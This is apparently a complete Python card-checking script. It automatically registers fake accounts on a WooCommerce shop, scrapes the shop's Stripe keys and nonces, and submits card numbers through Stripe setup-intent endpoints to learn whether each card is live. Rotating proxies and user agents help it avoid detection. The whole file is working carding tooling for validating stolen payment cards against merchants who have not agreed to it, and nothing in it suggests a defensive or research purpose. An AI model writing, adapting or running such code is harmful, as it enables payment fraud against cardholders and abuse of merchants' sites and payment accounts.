import requests
import time
import re
import random
import datetime
import uuid
import json


def check_status(response):
    resp = str(response).lower()

    if '"success":true' in resp and '"status":"succeeded"' in resp:
        return "Card Added"

    if '"requires_action"' in resp or '"status":"requires_action"' in resp:
        return "3D requires_action"

    if '"declined"' in resp:
        return "Card was Declined"

    match = re.search(r'"message":"([^"]+)"', resp)
    if match:
        msg = match.group(1)
        if "declined" in msg.lower():
            return "Card was Declined"
        return msg

    return "unknown"


def extract_value(text, patterns):
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1)
    return None


def VW(ccx, url=None, proxy_url=None, proxy_list=None, max_retries=3):
    for attempt in range(max_retries):
        px = proxy_url
        if proxy_list and attempt > 0:
            px = random.choice(proxy_list)
        result = _VW_once(ccx, url, px)
        rl = str(result).lower()
        if "connectionpool" in rl or "proxyerror" in rl or "connect timeout" in rl or "connection error" in rl or "nonce not found" in rl or "pk not found" in rl:
            continue
        return result
    return result


def _VW_once(ccx, url=None, proxy_url=None):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid card format"
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    session = requests.Session()

    if not url:
        url = "motherluckranch.com"

    URL = url.replace("https://", "").replace("http://", "").strip("/")

    if proxy_url:
        session.proxies.update({
            "http": proxy_url,
            "https": proxy_url,
        })

    def generate_guid():
        return str(uuid.uuid4())

    guid = generate_guid()
    muid = generate_guid()
    sid = generate_guid()
    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    ]
    random_user_agent = random.choice(user_agents)

    names = [
        "aarav","rohan","kunal","vikas","amit","rahul","sahil","ankit","deepak","nitin",
        "manish","pradeep","suresh","rakesh","vivek","akash","mohit","ravi","pankaj","sunil",
        "abhishek","rajesh","naveen","harsh","karan","sachin","yogesh","aman","tarun","shubham",
    ]
    name = random.choice(names)
    digits = random.randint(100, 999999)
    Temp_Mail = f"{name}{digits}@gmail.com"

    headers = {
        'authority': URL,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'cache-control': 'max-age=0',
        'referer': f'https://{URL}/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': random_user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        response = session.get(f'https://{URL}/my-account/', headers=headers, timeout=20, verify=False)
    except requests.RequestException as e:
        return f"Connection error: {str(e)[:60]}"

    match = re.search(r'<input[^>]*name="woocommerce-login-nonce"[^>]*value="([^"]+)"', response.text)
    login_nonce = match.group(1) if match else None

    match2 = re.search(r'<input[^>]*name="woocommerce-register-nonce"[^>]*value="([^"]+)"', response.text)
    register_nonce = match2.group(1) if match2 else None

    if not register_nonce:
        return "Register nonce not found — site may not support registration"

    headers['content-type'] = 'application/x-www-form-urlencoded'
    headers['origin'] = f'https://{URL}'

    data = {
        'email': Temp_Mail,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': f'https://{URL}/my-account/',
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': random_user_agent,
        'woocommerce-register-nonce': register_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    try:
        response = session.post(f'https://{URL}/my-account/', headers=headers, data=data, timeout=20, verify=False)
    except requests.RequestException as e:
        return f"Registration error: {str(e)[:60]}"

    response = session.get(f'https://{URL}/my-account/', headers=headers, timeout=20, verify=False)

    headers2 = {
        'authority': URL,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'referer': f'https://{URL}/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': random_user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        response = session.get(f'https://{URL}/my-account/add-payment-method/', headers=headers2, timeout=20, verify=False)
    except requests.RequestException as e:
        return f"Payment page error: {str(e)[:60]}"

    nonce_patterns = [
        r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"',
        r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"',
        r'"add_card_nonce"\s*:\s*"([a-zA-Z0-9]+)"',
    ]
    pk_patterns = [
        r'"key"\s*:\s*"(pk_(?:live|test)_[^"]+)"',
        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[^"]+)"',
    ]
    xox_patterns = [
        r'"accountId"\s*:\s*"(acct_[a-zA-Z0-9]+)"',
    ]

    confirm_nonce = extract_value(response.text, nonce_patterns)
    if not confirm_nonce:
        return "confirm_nonce not found"

    pk_value = extract_value(response.text, pk_patterns)
    if not pk_value:
        return "PK NOT FOUND"

    xox = extract_value(response.text, xox_patterns)

    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': random_user_agent,
    }

    pm_data = {
        'billing_details[name]': ' ',
        'billing_details[email]': Temp_Mail,
        'billing_details[address][country]': 'IN',
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
        'referrer': f'https://{URL}',
        'time_on_page': str(random.randint(100000, 999999)),
        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk_value,
    }

    if xox:
        pm_data['_stripe_account'] = xox
    else:
        pm_data['_stripe_version'] = '2024-06-20'

    try:
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pm_data, timeout=20, verify=False)
    except requests.RequestException as e:
        return f"Stripe PM error: {str(e)[:60]}"

    response_data = response.json()

    if 'error' in response_data:
        error_code = response_data['error'].get('code', '')
        if error_code == 'incorrect_number':
            return "Card number invalid"
        elif error_code == 'invalid_expiry_year':
            return "Invalid expiry year"
        elif error_code == 'invalid_expiry_month':
            return "Invalid expiry month"
        else:
            return response_data['error'].get('message', 'Unknown error')

    pm_id = response_data.get('id')
    if not pm_id:
        return "PM creation failed"

    confirm_headers = {
        'authority': URL,
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': f'https://{URL}',
        'referer': f'https://{URL}/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': random_user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    params1 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data1 = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': confirm_nonce}
    params2 = {'wc-ajax': 'wc_stripe_create_setup_intent'}
    data2 = {'stripe_source_id': pm_id, 'nonce': confirm_nonce}
    data3 = {'action': (None, 'create_setup_intent'), 'wcpay-payment-method': (None, pm_id), '_ajax_nonce': (None, confirm_nonce)}

    endpoints = [
        ('post', f'https://{URL}/wp-admin/admin-ajax.php', params1, data3, True),
        ('post', f'https://{URL}', params1, data1, False),
        ('post', f'https://{URL}/', params2, data2, False),
        ('post', f'https://{URL}/wp-admin/admin-ajax.php', params2, data2, False),
    ]

    for method, ep_url, params, data, is_files in endpoints:
        try:
            if is_files:
                r = session.post(ep_url, params=params, headers=confirm_headers, data=data, timeout=20, verify=False)
            else:
                r = session.post(ep_url, params=params, headers=confirm_headers, data=data, timeout=20, verify=False)
            msg = check_status(r.text)
            if msg in ["Card Added", "3D requires_action", "Card was Declined"]:
                return msg
        except requests.RequestException:
            continue

    return msg if msg else "unknown"
